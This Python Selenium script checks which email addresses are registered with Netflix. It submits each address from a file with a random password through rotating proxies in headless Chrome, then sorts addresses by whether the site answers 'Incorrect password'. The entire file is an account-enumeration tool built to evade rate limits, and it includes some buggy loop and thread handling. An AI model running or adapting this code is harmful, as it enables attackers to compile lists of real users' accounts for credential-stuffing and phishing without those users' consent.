from selenium import webdriver
from selenium.common.exceptions import *
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.remote.webelement import WebElement
from time import sleep
import random
import string
import time
import threading

def Find_Element(driver : webdriver.Chrome, by, value : str) -> WebElement:
    while True:
        try:
            element = driver.find_element(by, value)
            break
        except:
            pass
        sleep(0.1)
    return element

def Find_Elements(driver : webdriver.Chrome, by, value : str) -> list[WebElement]:
    while True:
        try:
            elements = driver.find_elements(by, value)
            if len(elements) > 0:
                break
        except:
            pass
        sleep(0.1)
    return elements

def Send_Keys(element : WebElement, content : str):
    element.clear()
    for i in content:
        element.send_keys(i)
        sleep(0.1)

with open(f'email.txt', 'r') as file:
    lines = file.readlines()

link = input('Please input Proxy link : ')

def genProxy():
    proxy_options = Options()
    proxy_options.add_argument('--headless')
    proxy_options.add_argument('--disable-gpu')
    proxy_driver = webdriver.Chrome(options = proxy_options)

    proxy_driver.get(link)
    proxies = proxy_driver.find_element(By.TAG_NAME, 'pre').text.split('\n')
    print(len(proxies))
    data = []
    for proxy in proxies[:]:
        data.append(proxy)
    return data

def genPassword():
    letters = string.ascii_letters
    password = ''.join(random.choice(letters) for _ in range(random.randint(8, 12)))
    print(f'Password : {password}')
    return password

time_set = input('Please input Proxy reloading time : ')
start_time = None
proxies = None
time_limit = int(time_set) * 60
proxy_update_lock = threading.Lock()
file_write_lock = threading.Lock()
thread_limit = threading.BoundedSemaphore(value = 3)

def process_email(line_number, line, proxies_container, start_time):
    global proxies
    while True:
        try:
            with proxy_update_lock:
                if time.time() - start_time > time_limit:
                    proxies = genProxy()
                    proxies_container[0] = proxies
            
            random_proxy = random.choice(proxies_container[0])
            options = Options()
            options.add_argument(f'--proxy-server=http://{random_proxy}')
            options.add_argument('--headless')
            options.add_argument('--disable-gpu')
            driver = webdriver.Chrome(options = options)
            print(f'Proxy : {random_proxy}')
            print(f'Email{line_number} : {line.strip()}')
            driver.get('https://www.netflix.com/')
            try:
                check = driver.find_element(By.CLASS_NAME, 'default-ltr-cache-1clcoym')
            except:
                check = None
            if check is not None:
                try:
                    banner_btn = driver.find_element(By.CLASS_NAME, 'banner-close-button')
                    driver.execute_script('arguments[0].click();', banner_btn)
                except:
                    pass
                sleep(0.5)
                signin_btn = Find_Element(driver, By.CLASS_NAME, 'default-ltr-cache-1clcoym')
                driver.execute_script("arguments[0].click();", signin_btn)
                sleep(0.5)

                email_box = Find_Element(driver, By.ID, 'id_userLoginId')
                Send_Keys(email_box, f'{line.strip()}')
                sleep(0.5)

                password_box = Find_Element(driver, By.ID, 'id_password')
                password = genPassword()
                Send_Keys(password_box, password)
                sleep(0.5)

                login_btn = Find_Element(driver, By.CLASS_NAME, 'login-button')
                driver.execute_script("arguments[0].click();", login_btn)
                sleep(0.5)

                error_message = Find_Element(driver, By.CLASS_NAME, 'ui-message-contents').text
                print(error_message)
                sleep(0.5)

                if error_message == 'Incorrect password. Please try again or you can reset your password.':
                    with file_write_lock:
                        with open('valid_email.txt', 'a') as f:
                            f.write(f'{line.strip()}\n')
                else:
                    with file_write_lock:
                        with open('invalid_email.txt', 'a') as f:
                            f.write(f'{line.strip()}\n')
                sleep(1)
                driver.quit()
        except NoSuchElementException:
            print(f'Could not load this link with proxy : {random_proxy}')
        except WebDriverException as e:
            print(f"WebDriverException encountered with proxy: {random_proxy}, error: {e}")
        finally:
            if driver:
                driver.quit()
                driver = None
        
        with proxy_update_lock:
            if proxies_container[0]:
                proxies_container[0].remove(random_proxy)
                if not proxies_container[0]:
                    proxies = genProxy()
                    proxies_container[0] = proxies
                    start_time = time.time()
            random_proxy = random.choice(proxies_container[0])

        thread_limit.release()

def main(proxies_container, start_time):
    threads = []
    for line_number, line in enumerate(lines, 1):
        thread_limit.acquire()
        t = threading.Thread(target = process_email, args = (line_number, line, proxies_container, start_time))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
            
if __name__ == "__main__":
    proxies = genProxy()
    proxies_container = [proxies]
    start_time = time.time()
    main(proxies_container, start_time)